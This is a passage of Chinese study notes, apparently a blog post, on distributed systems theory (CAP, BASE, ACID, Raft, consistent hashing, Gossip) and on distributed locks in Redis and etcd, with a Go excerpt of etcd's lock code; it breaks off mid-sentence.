指的是在一个分布式系统中，一致性（Consistency）、可用性（Availability）、分区容错性（Partition tolerance）。CAP 原则上，这三个要素最多只能同时实现两点，不可能三者兼顾。\n元素 含义 一致性（Consistency） 所有节点访问同一份最新的数据副本 可用性（Availability） 每次访问都能保证得到一个非报错的响应，但不保证数据是最新的 分区容错性（Partition tolerance） 当分布式系统遇到网络分区故障的时候，仍然可以对外界提供一致性、可用性的服务 2.1.1 一致性（Consistency） 这里的一致性指的是强一致性而不是最终一致性。一致性严谨的表述是原子读写，即所有的读写都应该看起来是“原子”的，或者“串行”的。也就是说，在一致性系统中，一旦客户端向系统内其中一个节点写入一份数据，那么之后client从其他节点读取到的都是刚刚写入的数据。\n上面的系统模拟一致性模型。\n客户端向分布式系统其中一个节点写入val1 由于val1是新写入的值，其他节点（B、C）都没有设置该值，所以需要从A节点同步该数据 待全部节点都同步完成之后，A节点再向客户端返回一个成功写入的响应。 之后，另一个客户端向B节点请求该数据的时候，B节点可以直接该值返回给该客户端 2.1.2 可用性（Availability） 分布式系统中的非故障节点在收到请求时，都必须返回响应。\n在可用系统中，如果我们的客户端向服务器发送请求，并且服务器未崩溃，则服务器必须最终响应客户端，不允许服务器忽略客户的请求。\n2.1.3 分区容错性（Partition tolerance） 允许网络丢失从一个节点发送到另一个节点的任意多条消息，即不同步 也就是说，节点A和节点B发送给对方的任何消息都是可以放弃的，也就是说节点A和节点B可能因为各种意外情况，导致无法成功进行同步，分布式系统要能容忍这种情况。\n2.1.4 三者不可同时兼顾 假设三者能同时兼顾\n首先我们对系统进行分区，由于满足分区容错性，节点A与节点B之间不能够进行正常通信，初始值都为val0 这时，客户端向节点A写入val1，但是因为分区容错性，该val1没有同步到节点B。此时，节点A是val1，节点B是val0。 由于需要满足可用性，节点A必须向client1返回数据。 这时，client2向节点B访问数据，节点B只能返回val0 显然，节点A与节点B出现了数据不一致的现象，不能满足一致性。\n2.1.5 三者权衡 CA (Consistency + Availability)：关注一致性和可用性，它需要非常严格的全体一致的协议，比如“两阶段提交”（2PC）。CA 系统不能容忍网络错误或节点错误，一旦出现这样的问题，整个系统就会拒绝写请求，因为它并不知道对面的那个结点是否挂掉了，还是只是网络问题。唯一安全的做法就是把自己变成只读的。 CP (consistency + partition tolerance)：关注一致性和分区容忍性。它关注的是系统里大多数人的一致性协议，比如：Paxos 算法 (Quorum 类的算法)。这样的系统只需要保证大多数结点数据一致，而少数的结点会在没有同步到最新版本的数据时变成不可用的状态。这样能够提供一部分的可用性。 AP (availability + partition tolerance)：这样的系统关心可用性和分区容忍性。因此，这样的系统不能达成一致性，需要给出数据冲突，给出数据冲突就需要维护数据版本。 2.2 BASE理论 BASE理论是Basically Available(基本可用)，Soft State（软状态）和Eventually Consistent（最终一致性）三个短语的缩写\n核心思想：\n即使无法做到强一致性（Strong consistency），但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。\n2.2.1 基本可用（Basically Available） 基本可用是指分布式系统在出现故障的时候，允许损失部分可用性，即保证核心可用。\n相较于正常的系统而言：\n**响应时间上的损失：**正常情况下的搜索引擎0.5秒即返回用户结果，而基本可用的搜索引擎可以在2秒作用返回结果。 **功能上的损失：**在一个电商网站上，正常情况下，用户可以顺利完成每一笔订单 2.2.2 软状态（Soft State） 软状态是指允许系统存在中间状态，而该中间状态不会影响系统整体可用性。分布式存储中一般一份数据至少会有三个副本，允许不同节点间副本同步的延时就是软状态的体现\n2.2.3 最终一致性（Eventual Consistency） 最终一致性是指系统中的所有数据副本经过一定时间后，最终能够达到一致的状态。\n2.3 ACID ACID是传统数据库常用的设计理念，追求强一致性模型。\n关系数据库的ACID模型拥有 高一致性 + 可用性 很难进行分区：\n原子性（Atomicity）：一个事务中所有操作都必须全部完成，要么全部不完成。 一致性（Consistency）：在事务开始或结束时，数据库应该在一致状态。 隔离性（Isolation）：事务的隔离性是多个用户并发访问数据库时，数据库为每一个用户开启的事务，不能被其他事务的操作数据所干扰，多个并发事务之间要相互隔离。 持久性（Durability）：持久性是指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来即使数据库发生故障也不应该对其有任何影响 三、分布式协议和算法 3.1 Raft 算法 3.1.1 背景 在Raft算法诞生之前，Paoxs几乎成为了一致性协议的代名词。1990年，Leslie Lamport教授向ACM Transactions on Computer Systems提交了关于Paxos算法的论文。然而，对大多数人来说，理解Paxos太困难了，而且难以实现。而一致性协议对大规模分布式系统又非常重要。因此，斯坦福大学的Diego Ongaro 和 John Ousterhout 决定设计一种比Paxos更容易理解的一致性算法\u0026mdash;-Raft\n3.1.2 概念 Raft是实现分布式共识的一种算法，主要用来管理日志复制的一致性。它和Paxos的功能是一样，但是相比于Paxos，Raft算法更容易理解、也更容易应用到实际的系统当中。\nRaft的三个角色（状态）\n在一个由Raft协议组织的集群中，一共包含如下3类角色：\nLeader（领导人）：负责日志的同步管理，处理来自客户端的请求，与Follower保持heartBeat的联系。同一时刻最多只有一个Leader存在。 Candidate（候选人）：负责选举投票，集群刚启动或者Leader宕机时，状态为Follower的节点将转为Candidate并发起选举，选举胜出（获得超过半数节点的投票）后，从Candidate转为Leader状态。 Follower（群众）：响应 Leader 的日志同步请求，响应Candidate的邀票请求，以及把客户端请求到Follower的事务转发（重定向）给Leader。所有节点开始的时候都是Follower状态。 复制状态机\n在一个分布式数据库中，如果每个节点的状态一致，每个节点都执行相同的命令序列，那么最终他们会得到一个一致的状态。也就是和说，为了保证整个分布式系统的一致性，我们需要保证每个节点执行相同的命令序列，也就是说每个节点的日志要保持一样。所以说，保证日志复制一致就是Raft等一致性算法的工作了。\n这里就涉及Replicated State Machine（复制状态机）。它的基本思想是一个分布式的复制状态机系统由多个复制单元组成，每个复制单元均是一个状态机，它的状态保存在一组状态变量中。如上图所示。在一个节点上，一致性模块（Consensus Module，也就是分布式共识算法）接收到了来自客户端的命令。然后把接收到的命令写入到日志中，该节点和其他节点通过一致性模块进行通信确保每个日志最终包含相同的命令序列。一旦这些日志的命令被正确复制，每个节点的状态机（State Machine）都会按照相同的序列去执行他们，从而最终得到一致的状态。然后将达成共识的结果返回给客户端。\n任期（Term）\n在分布式系统中，“时间同步”是一个很大的难题，因为每个机器可能由于所处的地理位置、机器环境等因素会不同程度造成时钟不一致，但是为了识别“过期信息”，时间信息必不可少。\nRaft算法中就采用任期（Term）的概念，将时间切分为一个个的Term（同时每个节点自身也会本地维护currentTerm），可以认为是逻辑上的时间。\n每一任期的开始都是一次领导人选举，一个或多个候选人（Candidate）会尝试成为领导（Leader）。如果一个人赢得选举，就会在该任期（Term）内剩余的时间担任领导人。在某些情况下，选票可能会被评分，有可能没有选出领导人（如t3），那么，将会开始另一任期，并且理科开始下一次选举。Raft 算法保证在给定的一个任期最少要有一个领导人。\n心跳（heartbeats）和超时机制（timeout）\n在Raft算法中，有两个timeout机制来控制领导人选举：\n一个是选举定时器（election timeout）：即Follower等待成为Candidate状态的等待时间，这个时间被随机设定为150ms~300ms之间。\n另一个是heartbeat timeout：在某个节点成为Leader以后，它会发送Append Entries消息给其他节点，这些消息就是通过heartbeat timeout来传送，Follower接收到Leader的心跳包的同时也重新设置选举定时器。\n3.1.3 工作机制 Raft将一致性问题分解成了三个相对独立的子问题：\n**选举（Leader Election）：**当Leader宕机或者集群初始化时，一个新的Leader需要被选举出来； **日志复制（Log Replication）：**Leader接收来自客户端的请求并将其以日志条目的形式复制到集群中的其他节点，并且强制要求其他节点的日志与自己保持一致； **安全性（Safety）：**如果任何服务器节点已经应用了一个确定的日志条目到它的状态机中，那么其他服务器节点不能在同一个日志索引位置应用一个不同的指令。 领导人选举（Leader Election） （1）一开始，所有节点都是以Follower角色启动，所有节点的状态都是 Follower，初始 Term（任期）为 0。同时启动选举定时器（时间随机，降低冲突概率），超时时间在100~500 毫秒之间且并不一致。\n（2）如果一个节点发现在超过选举定时器的时间后一直没有收到Leader发送的心跳请求，则该节点就会成为候选人（Candidate），并且一直处于该状态，直到下列三种情况发生：\n该节点（Candidate）在选举中获胜 其他节点赢得了选举 一段时间后没有任何一台服务器赢得选举（这时候，就会进入下一轮Term的选举，并随机设置选举定时器的时间） （3）然后这个候选人（Candidate）就会向其他节点发送投票请求（Request Vote），如果得到半数以上节点的同意，就成为Leader（Leader）。如果选举超时，还没有Leader选出，则进入下一任期（Term），重新选举。 （4）完成Leader选举后，Leader就会定时给其他节点发送心跳包（Heartbeat），告诉其他节点Leader还在运行，同时重置这些节点的选举定时器。\n日志复制（Log Replication） 在一个Raft集群中，只有Leader节点可以处理客户端的请求（如果客户端的请求发送到了Follower，Follower将请求重定向到Leader），客户端的每个请求都包含一条被复制状态机执行的指令。Leader将这条指令作为一条新的日志条目（Entry）附加到日志中去，然后并行地将附加条目发送给Follower，让它们复制这条日志条目。\n（1）客户端向Leader提交指令，Leader收到命令后，将命令追加到本地日志中。此时，这个命令处于“uncomitted”状态，复制状态机不会执行该命令。 （2）Leader 与 Followers 之间保持着心跳联系，随心跳 Leader 将追加的 Entry（AppendEntries）并行地发送给其它的 Follower，并让它们复制这条日志条目，这一过程称为复制（Replicate）。 注意：\nLeader 向 Followers 发送的不仅仅是追加的 Entry（AppendEntries）。\n在发送追加日志条目的时候，Leader会将新的日志条目紧接着之前条目的索引位置（preLogIndex），Leader 任期号（Term）也包含在其中。如果 Follower 在它的日志中找不到包含相同索引位置和任期号的条目，那么它就会拒绝接收新的日志条目，因为出现这种情况说明 Follower 和 Leader 不一致。\n如何解决 Leader 与 Follower 不一致的问题？\nLeader和Follower一系列崩溃的青葵会使它们的日志处于不一致状态。Follower可能会丢失一些在新的Leader中有的日志条目，它可能会拥有一些Leader没有的日志条目，又或者两个都有可能发送。\n要使两者回复一致，Leader需要找到两者最后达到一致的地方（LogIndex），实际上是个回溯的过程，然后删除从那个点之后的全部日志条目，发送自己的日志给 Follower。所有的这些操作都在进行附加日志的一致性检查时完成。\nLeader为每个Follower都维护一个nextIndex，它表示下一个需要发送给Follower的日志条目的索引。当一个节点刚转为Leader时，它会初始化所有的nextIndex值，为自己的最后一个日志的index+1。如果一个Follower的日志和Leader不一致，那么在下一次AppendEntry的时候就会失败。在被 Follower 拒绝之后，Leader 就会减小该 Follower 对应的 nextIndex 值并进行重试。最终 nextIndex 会在某个位置使得 Leader 和 Follower 的日志达成一致。当这种情况发生，附加日志就会成功，这时就会把 Follower 冲突的日志条目全部删除并且加上 Leader 的日志。一旦附加日志成功，那么 Follower 的日志就会和 Leader 保持一致，并且在接下来的任期继续保持一致。 （3）Leader等待Follower回应。 Followers接收到Leader发送过来的复制请求后，有两种可能的回应\n写入本地日志中，返回Success 一致性检查失败，拒绝写入，返回False 当 Leader 收到大多数 Followers 的回应后，会将写入的 Entry 标记为提交状态（Committed），并把这条日志条目应用到它的状态机中。\n（4）前面完成后，Leader会向客户端回应。\n（5）Leader节点在提交命令后，下一次的心跳包中就带有通知其他节点提交命令的消息，其他节点收到Leader的消息后，就将命令应用到状态机中（State Machine），最终每个节点的日志都保持了一致性。\n安全性（Safety） 不能保证每个状态机能按照相同的顺序执行同样的指令。例如，当领导人提交了若干日志条目的同时一个追随者可能宕机了，之后它又被选为了领导人然后用新的日志条目覆盖掉了旧的那些，最后，不同的状态机可能执行不同的命令序列。\n因此，Raft算法通过在领导人选举阶段增加一个限制来完善了Raft算法。该限制可以保证，Leader对于固定的任期号（Term），都拥有之前任期的所有被提交的日志条目。\n选举限制\n在所有基于 Leader 机制的一致性算法中，Leader 都必须存储所有已经提交的日志条目。一个Candidate节点要成为赢得选举，就需要跟网络中大部分节点进行通信，这就意味着每一条已经提交的日志条目最少在其中一台服务器上出现。Raft 使用了一种简单而有效的方法，以保证所有之前的任期号中已经提交的日志条目在选举的时候都会出现在新的 Leader 中。换言之，日志条目的传送是单向的，只从 Leader 传给 Follower，并且 Leader 从不会覆盖自身本地日志中已经存在的条目。RequestVote RPC 实现了这个限制：这个 RPC包括候选人的日志信息，如果它自己的日志比候选人的日志要新，那么它会拒绝候选人的投票请求。\n3.2 一致性算法 3.2.1 前言 在互联网中，一致性哈希算法(Consistent Hashing)在分布式系统的应用还是十分广泛的。一致性哈希算法最早在论文《Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web》中提出。具体思路就是一致性哈希将整个哈希输出空间设置为一个环形区域。\n3.2.2 分布式缓存 随着业务的发展，流量的剧增，单体项目逐渐划分为分布式系统。对于经常访问的数据，我们可以使用缓存机制来存储，减少数据库的压力。\n一般会使用Redis作为缓存，为了保证Redis的高可用，我们一般会对Redis做主从复制，组成Master-Slave的形式，进行数据的读写分离。\n优化的最简单的策略是随机分配请求。每次Redis请求会随机发送到其中一个集群中，这种策略会存在下面的两个问题：\n同一份数据可能在多个Redis集群中存在，造成数据冗余。 某一份数据在其中一台Redis数据库已存在，但是再次访问Redis数据库，并没有命中数据已存在的库。无法保证对相同的key的所有访问都发送到相同的Redis中。 为了解决上述的问题，我们可以使用hash算法，将key 进行hash取模，将数据保存到特定的Redis数据库中。例如，我们有6台服务器，存储图片的时候，可以将图片的名称作为key，计算key 的hash值 再%6，得到0-5 中其中一个值，这个值对应的是服务器的编号，也就是该图片保存到的服务器的编号。\n但是，使用上述的hash算法进行缓存的时候，会出现一些缺陷，试想一下，如果6台服务已经无法满足我们的需求的时候，我们需要增加服务器的数量，例如数量由6变成8，此时，如果再用这种方法存储一张图片的话，那么这张图片所在的服务器编号必定与原来6台服务器时所在的服务器编号不同，除数由6变8，余数肯定不同了。这种情况带来的结果就是当服务器数量变动时，所有缓存的位置都要发生改变，换句话说，当服务器数量发生改变时，所有缓存在一定时间内是失效的，当应用无法从缓存中获取数据时，则会向后端服务器请求数据，同理，假设3台缓存中突然有一台缓存服务器出现了故障，无法进行缓存，那么我们则需要将故障机器移除，但是如果移除了一台缓存服务器，那么缓存服务器数量从6台变为4台，如果想要访问一张图片，这张图片的缓存位置必定会发生改变，以前缓存的图片也会失去缓存的作用与意义，由于大量缓存在同一时间失效，造成了缓存的雪崩，此时前端缓存已经无法起到承担部分压力的作用，后端服务器将会承受巨大的压力，整个系统很有可能被压垮，所以，我们应该想办法不让这种情况发生，但是由于上述HASH算法本身的缘故，使用取模法进行缓存时，这种情况是无法避免的，为了解决这些问题，一致性哈希算法诞生了。\n3.2.3 一致性哈希算法 上述方法存在的问题：\n当缓存服务器数量发生变化的时候，会引起缓存雪崩，可能会造成整体系统压力过大而崩溃（大量缓存同时失效） 当缓存服务器数量发生变换的时候，几乎所有缓存的位置都发生了变化 其实，一致性哈希算法也是使用取模的方法，只是，刚才描述的取模法是对服务器的数量进行取模，而一致性哈希算法是对2^32取模\n一致哈希 是一种特殊的哈希算法。在使用一致哈希算法后，哈希表槽位数（大小）的改变平均只需要对 K/n 个关键字重新映射，其中K是关键字的数量， n是槽位数量。然而在传统的哈希表中，添加或删除一个槽位的几乎需要对所有关键字进行重新映射。\n一致性hash算法将整个hash空间组织成一个虚拟的圆环，Hash函数的值空间为0 ~ 2^32 - 1(一个32位无符号整型)\n整个空间按顺时针方向组织，我们将各个服务器使用Hash进行一个哈希，具体可以选择服务器的IP或主机名作为关键字进行哈希，这样每台服务器就确定在了哈希环的一个位置上。\nhash（服务器A的IP地址） % 2^32\n通过上述公式算出的结果一定是一个0到2^32-1之间的一个整数，我们就用算出的这个整数，代表服务器A，既然这个整数肯定处于0到2^32-1之间，那么，上图中的hash环上必定有一个点与这个整数对应，而我们刚才已经说明，使用这个整数代表服务器A，那么，服务器A就可以映射到这个环上，其他的服务器也依次类推，最后如下图示意\n假设，我们需要使用缓存服务器缓存图片，而且我们仍然使用图片的名称作为找到图片的key，那么我们使用如下公式可以将图片映射到上图中的hash环上。从此位置沿顺时针滚动，遇到的第一台服务器就是其应该定位到的服务器。\nhash（图片名称） % 2^32\n映射后的示意图如下，下图中的橘黄色圆形表示图片。\n一致性哈希算法就是通过这种方法，判断一个对象应该被缓存到哪台服务器上的，将缓存服务器与被缓存对象都映射到hash环上以后，从被缓存对象的位置出发，沿顺时针方向遇到的第一个服务器，就是当前对象将要缓存于的服务器，由于被缓存对象与服务器hash后的值是固定的，所以，在服务器不变的情况下，一张图片必定会被缓存到固定的服务器上，那么，当下次想要访问这张图片时，只要再次使用相同的算法进行计算，即可算出这个图片被缓存在哪个服务器上，直接去对应的服务器查找对应的图片即可。\n优点 容错性\n假如服务器B宕机了，那么，原本存储到服务器B的数据B保存到服务器C中。因此，其中一台宕机后，干扰的只有前面的数据（原数据被保存到顺时针的下一个服务器），而不会干扰到其他的数据。\n拓展性\n假如在服务器B与服务器C之间添加服务器D，数据C就会保存到服务器D，受影响的只有服务器C，其他数据不会有影响。\n缺点 前面部分都是讲述到服务器节点较多和节点分布较为均衡的情况，如果节点较少就会出现节点分布不均衡造成数据倾斜问题。\n如果服务器被映射成上图中的模样，那么被缓存的对象很有可能大部分集中缓存在某一台服务器上。如果出现上图中的情况，A、B、C三台服务器并没有被合理的平均的充分利用，缓存分布的极度不均匀，而且，如果此时服务器A出现故障，那么失效缓存的数量也将达到最大值，在极端情况下，仍然有可能引起系统的崩溃，上图中的情况则被称之为hash环的偏斜，那么，我们应该怎样防止hash环的偏斜呢？一致性hash算法中使用”虚拟节点”解决了这个问题。\n3.2.4 虚拟节点 为了解决这种数据存储不平衡的问题，一致性哈希算法引入了虚拟节点机制，即对每个节点计算多个哈希值，每个计算结果位置都放置在对应节点中，这些节点称为虚拟节点。\n从上图可以看出，A、B、C三台服务器分别虚拟出了一个虚拟节点，当然，如果你需要，也可以虚拟出更多的虚拟节点。引入虚拟节点的概念后，缓存的分布就均衡多了，上图中，1号、3号图片被缓存在服务器A中，5号、4号图片被缓存在服务器B中，6号、2号图片被缓存在服务器C中，如果你还不放心，可以虚拟出更多的虚拟节点，以便减小hash环偏斜所带来的影响，虚拟节点越多，hash环上的节点就越多，缓存被均匀分布的概率就越大。\n3.3 Gossip 协议 Gossip 协议，顾名思义，就像流言蜚语一样，利用一种随机、带有传染性的方式，将信息 传播到整个网络中，并在一定时间内，使得系统内的所有节点数据一致。对你来说，掌握这 个协议不仅能很好地理解这种最常用的，实现最终一致性的算法，也能在后续工作中得心应 手地实现数据的最终一致性。\n3.3.1 Gossip 三板斧 Gossip 的三板斧分别是：直接邮寄（Direct Mail）、**反熵（Anti-entropy）**和 谣言传播（Rumor mongering）。\n3.3.2 直接邮寄（Direct Mail） 直接邮寄：就是直接发送更新数据，当数据发送失败时，将数据缓存下来，然后重传。从图中你可以看到，节点 A 直接将更新数据发送给了节点 B、C。\n但是直接邮寄有个不足之处就是当缓存队列满了的时候，会造成数据丢失，所以只采用直接邮寄是无法实现最终一致性的。\n3.3.3 反熵（Anti-entropy） 反熵 ：指的是集群中的节点，每隔一段时间就随机选择某个其他节点，然后通过相互交换自己的所有数据来消除两者之间的差异，实现数据的最终一致性：\n实现反熵的时候，主要有 推、拉和推拉三种方式\n推方式，就是将自己的所有副本数据，推给对方，修复对方副本中的熵：\n拉方式，就是拉取对方的所有副本数据，修复自己副本中的熵：\n推拉的方式就是同时修复自己的副本和对方副本的熵：\n注意：反熵需要节点两两交换和对比自己所有的数据，执行反熵时通讯成本会很高，所以在实际场景中避免频繁执行反熵，并且可以通过引入校验和等机制，减少需要对比的数据量和通讯信息等。\n虽然反熵比较实用，但是执行反熵时，相关的节点都是已知的，而且节点数量不能太多，如果是一个动态变化或节点数比较多的分布式环境，这时候反熵就不适用了。当面对这种场景的时候就得通过“谣言传播”来实现最终一致性。\n3.3.4 谣言传播（Rumor mongering） 谣言传播，广泛地散播谣言，它指的是当一个节点有了新数据后，这个节点变成活跃状态，并周期性地联系其他节点向其发送新数据，直到所有的节点都存储了该新数据：\n节点 A 向节点 B、D 发送新数据，节点 B 收到新数据后，变成活跃节点，然后节点 B 向节点 C、D 发送新数据。其实，谣言传播非常具有传染性，它适合动态变化的分布式系统。\n3.3.5 小结 在实际场景中，实现数据副本的最终一致性时，一般而言，直接邮寄的方式是一定要实现的，因为不需要做一致性对比，只是通过发送更新数据或缓存重传，来修复数据的不一致，性能损耗低。在存储组件中，节点都是已知的，一般采用反熵修复数据副本的一致性。当集群节点是变化的，或者集群节点数比较多时，这时要采用谣言传播的方式，同步更新数据，实现最终一致。\n四、 分布式锁 4.1 初始锁 1. 锁的双面性\n现在我们写的程序基本上都有一定的并发性，要么单台多进线程、要么多台机器集群化，在仅读的场景下是不需要加锁的，因为数据是一致的，在读写混合或者写场景下如果不加以限制和约束就会造成写混乱数据不一致的情况。\n如果业务安全和正确性无法保证，再多的并发也是无意义的。\n高并发多半是考验基础架构是否强悍，合理正确地使用锁才是个人能力的体现。\n凡事基本上都是双面的，锁可以在一定程度上保证数据的一致性，但是锁也意味着维护和使用的复杂性，当然也伴随着性能的损耗，最大的锁可能就是CPython解释器的全局解释器锁GIL了。\n2.单机锁和分布式锁\n锁依据使用范围可简单分为：单机锁和分布式锁。\nLinux提供系统级单机锁，这类锁可以实现线程同步和互斥资源的共享，单机锁实现了机器内部线程之间对共享资源的并发控制。\n在分布式部署高并发场景下，经常会遇到资源的互斥访问的问题，最有效最普遍的方法是给共享资源或者对共享资源的操作加一把锁。\n分布式锁是控制分布式系统之间同步访问共享资源的一种方式，用于在分布式系统中协调他们之间的动作。\n4.2 分布式锁 1. 分布式锁的实现简介\n分布式CAP理论告诉我们需要做取舍:\n任何一个分布式系统有三大特性：一致性Consistency、可用性Availability和分区容错性Partition Tolerance，但是由于网络分区不受人为控制，在网络发生分区时，我们必须在可用性和一致性二者中选择之一。\n在互联网领域的绝大多数的场景中，都需要牺牲强一致性来换取系统的高可用性，系统往往只保证最终一致性。在很多场景中为了保证数据的最终一致性，需要很多的技术方案来支持，比如分布式事务、分布式锁等。\n分布式锁一般有四种实现方式：\n基于数据库 在数据库中创建一张表，表里包含方法名等字段，并且在方法名字段上面创建唯一索引，执行某个方法需要使用此方法名向表中插入数据，成功插入则获取锁，执行结束则删除对应的行数据释放锁 基于缓存数据库Redis Redis性能好并且实现方便，但是单节点的分布式锁在故障迁移时产生安全问题，Redlock是Redis的作者 Antirez 提出的集群模式分布式锁，基于N个完全独立的Redis节点实现分布式锁的高可用 基于ZooKeeper ZooKeeper 是以 Paxos 算法为基础的分布式应用程序协调服务，为分布式应用提供一致性服务的开源组件 基于Etcd Etcd是基于Raft算法为基础的分布式应用程序协调服务，为分布式应用提供一致性服务的开源组件 2. 分布式锁需要具备的条件\n分布式锁在应用于分布式系统环境相比单机锁更为复杂，该锁需要具备一些特性：\n互斥性：在任意时刻，只有一个客户端（进程）能持有锁 安全性：避免死锁情况，当一个客户端在持有锁期间内，由于意外崩溃而导致锁未能主动解锁，其持有的锁也能够被正确释放，并保证后续其它客户端也能加锁 可用性：分布式锁需要有一定的高可用能力，当提供锁的服务节点故障（宕机）时不影响服务运行，避免单点风险，如Redis的集群模式、哨兵模式，ETCD/zookeeper的集群选主能力等保证HA，保证自身持有的数据与故障节点一致。 对称性：对同一个锁，加锁和解锁必须是同一个进程，即不能把其他进程持有的锁给释放了，这又称为锁的可重入性。 4.3 基于Redis实现分布式锁 既然是锁，核心操作无外乎加锁、解锁。\nRedis的加锁操作：\nSET lock_name my_random_value NX PX 30000 lock_name，锁的名称，对于 Redis 而言，lock_name 就是 Key-Value 中的 Key，具有唯一性。 random_value，由客户端生成的一个随机字符串，它要保证在足够长的一段时间内，且在所有客户端的所有获取锁的请求中都是唯一的，用于唯一标识锁的持有者。 NX 只有当 lock_name(key) 不存在的时候才能 SET 成功，从而保证只有一个客户端能获得锁，而其它客户端在锁被释放之前都无法获得锁。 PX 30000 表示这个锁节点有一个 30 秒的自动过期时间（目的是为了防止持有锁的客户端故障后，无法主动释放锁而导致死锁，因此要求锁的持有者必须在过期时间之内执行完相关操作并释放锁）。 Redis的解锁操作：\ndel lock_name 在加锁时为锁设置过期时间，当过期时间到达，Redis 会自动删除对应的 Key-Value，从而避免死锁。注意，这个过期时间需要结合具体业务综合评估设置，以保证锁的持有者能够在过期时间之内执行完相关操作并释放锁。 正常执行完毕，未到达锁过期时间，通过del lock_name主动释放锁。 上述方式实现的redis分布锁有个缺点：\n只作用在一个Redis节点上，即使Redis通过sentinel保证高可用，如果这个master节点由于某些原因发生了主从切换，那么就会出现锁丢失的情况：\n在Redis的master节点上拿到了锁；但是这个加锁的key还没有同步到slave节点；\nmaster故障，发生故障转移，slave节点升级为master节点；导致锁丢失。\n由此 redis官方推荐 redlock 来解决这个问题。\nRedlock\nRedlock：全名叫做 Redis Distributed Lock;即使用redis实现的分布式锁；\n使用场景：多个服务间保证同一时刻同一时间段内同一用户只能有一个请求（防止关键业务出现并发攻击）；\n官网文档地址如下：https://redis.io/topics/distlock\n这个锁的算法实现了多redis实例的情况，相对于单redis节点来说，优点在于 防止了 单节点故障造成整个服务停止运行的情况；并且在多节点中锁的设计，及多节点同时崩溃等各种意外情况有自己独特的设计方法；\n多节点redis实现的分布式锁算法(RedLock):有效防止单点故障\n假设有5个完全独立的redis主服务器\n1.获取当前时间戳\n2.client尝试按照顺序使用相同的key,value获取所有redis服务的锁，在获取锁的过程中的获取时间比锁过期时间短很多，这是为了不要过长时间等待已经关闭的redis服务。并且试着获取下一个redis实例。\n比如：TTL为5s,设置获取锁最多用1s，所以如果一秒内无法获取锁，就放弃获取这个锁，从而尝试获取下个锁\n3.client通过获取所有能获取的锁后的时间减去第一步的时间，这个时间差要小于TTL时间并且至少有3个redis实例成功获取锁，才算真正的获取锁成功\n4如果成功获取锁，则锁的真正有效时间是 TTL减去第三步的时间差 的时间；比如：TTL 是5s,获取所有锁用了2s,则真正锁有效时间为3s(其实应该再减去时钟漂移);\n5.如果客户端由于某些原因获取锁失败，便会开始解锁所有redis实例；因为可能已经获取了小于3个锁，必须释放，否则影响其他client获取锁\n4.4 基于etcd实现分布式锁 4.4.1 机制 etcd 支持以下功能，正是依赖这些功能来实现分布式锁的：\nLease 机制：即租约机制（TTL，Time To Live），Etcd 可以为存储的 KV 对设置租约，当租约到期，KV 将失效删除；同时也支持续约，即 KeepAlive。 Revision 机制：每个 key 带有一个 Revision 属性值，etcd 每进行一次事务对应的全局 Revision 值都会加一，因此每个 key 对应的 Revision 属性值都是全局唯一的。通过比较 Revision 的大小就可以知道进行写操作的顺序。 在实现分布式锁时，多个程序同时抢锁，根据 Revision 值大小依次获得锁，可以避免 “羊群效应” （也称 “惊群效应”），实现公平锁。 Prefix 机制：即前缀机制，也称目录机制。可以根据前缀（目录）获取该目录下所有的 key 及对应的属性（包括 key, value 以及 revision 等）。 Watch 机制：即监听机制，Watch 机制支持 Watch 某个固定的 key，也支持 Watch 一个目录（前缀机制），当被 Watch 的 key 或目录发生变化，客户端将收到通知。 4.4.2 过程 步骤 1: 准备\n客户端连接 Etcd，以 /lock/mylock 为前缀创建全局唯一的 key，假设第一个客户端对应的 key=\u0026quot;/lock/mylock/UUID1\u0026quot;，第二个为 key=\u0026quot;/lock/mylock/UUID2\u0026quot;；客户端分别为自己的 key 创建租约 - Lease，租约的长度根据业务耗时确定，假设为 15s；\n步骤 2: 创建定时任务作为租约的“心跳”\n当一个客户端持有锁期间，其它客户端只能等待，为了避免等待期间租约失效，客户端需创建一个定时任务作为“心跳”进行续约。此外，如果持有锁期间客户端崩溃，心跳停止，key 将因租约到期而被删除，从而锁释放，避免死锁。\n步骤 3: 客户端将自己全局唯一的 key 写入 Etcd\n进行 put 操作，将步骤 1 中创建的 key 绑定租约写入 Etcd，根据 Etcd 的 Revision 机制，假设两个客户端 put 操作返回的 Revision 分别为 1、2，客户端需记录 Revision 用以接下来判断自己是否获得锁。\n步骤 4: 客户端判断是否获得锁\n客户端以前缀 /lock/mylock 读取 keyValue 列表（keyValue 中带有 key 对应的 Revision），判断自己 key 的 Revision 是否为当前列表中最小的，如果是则认为获得锁；否则监听列表中前一个 Revision 比自己小的 key 的删除事件，一旦监听到删除事件或者因租约失效而删除的事件，则自己获得锁。\n步骤 5: 执行业务\n获得锁后，操作共享资源，执行业务代码。\n步骤 6: 释放锁\n完成业务流程后，删除对应的key释放锁。\n4.4.3 原理 Lock()函数的实现很简单：\n// Lock locks the mutex with a cancelable context. If the context is canceled // while trying to acquire the lock, the mutex tries to clean its stale lock entry. func (m *Mutex) Lock(ctx context.Context) error { s := m.s client := m.s.Client() m.myKey = fmt.Sprintf(\u0026quot;%s%x\u0026quot;, m.pfx, s.Lease()) cmp := v3.Compare(v3.CreateRevision(m.myKey), \u0026quot;=\u0026quot;, 0) // put self in lock waiters via myKey; oldest waiter holds lock put := v3.OpPut(m.myKey, \u0026quot;\u0026quot;, v3.WithLease(s.Lease())) // reuse key in case this session already holds the lock get := v3.OpGet(m.myKey) // fetch current holder to complete uncontended path with only one RPC getOwner := v3.OpGet(m.pfx, v3.WithFirstCreate()...) resp, err := client.Txn(ctx).If(cmp).Then(put, getOwner).Else(get, getOwner).Commit() if err != nil { return err } m.myRev = resp.Header.Revision if !resp.Succeeded { m.myRev = resp.Responses[0].GetResponseRange().Kvs[0].CreateRevision } // if no key on prefix / the minimum rev is key, already hold the lock ownerKey := resp.Responses[1].GetResponseRange().Kvs if len(ownerKey) == 0 || ownerKey[0].CreateRevision == m.myRev { m.hdr = resp.Header return nil } // wait for deletion revisions prior to myKey hdr, werr := waitDeletes(ctx, client, m.pfx, m.myRev-1) // release lock key if wait failed if werr != nil { m.Unlock(client.Ctx()) } else { m.hdr = hdr } return werr } 首先通过一个事务来尝试加锁，这个事务主要包含了4个操作: cmp、put、get、getOwner。需要注意的是，key是由pfx和Lease()组成的。\ncmp: 比较加锁的key的修订版本是否是0。如果是0就代表这个锁不存在。 put: 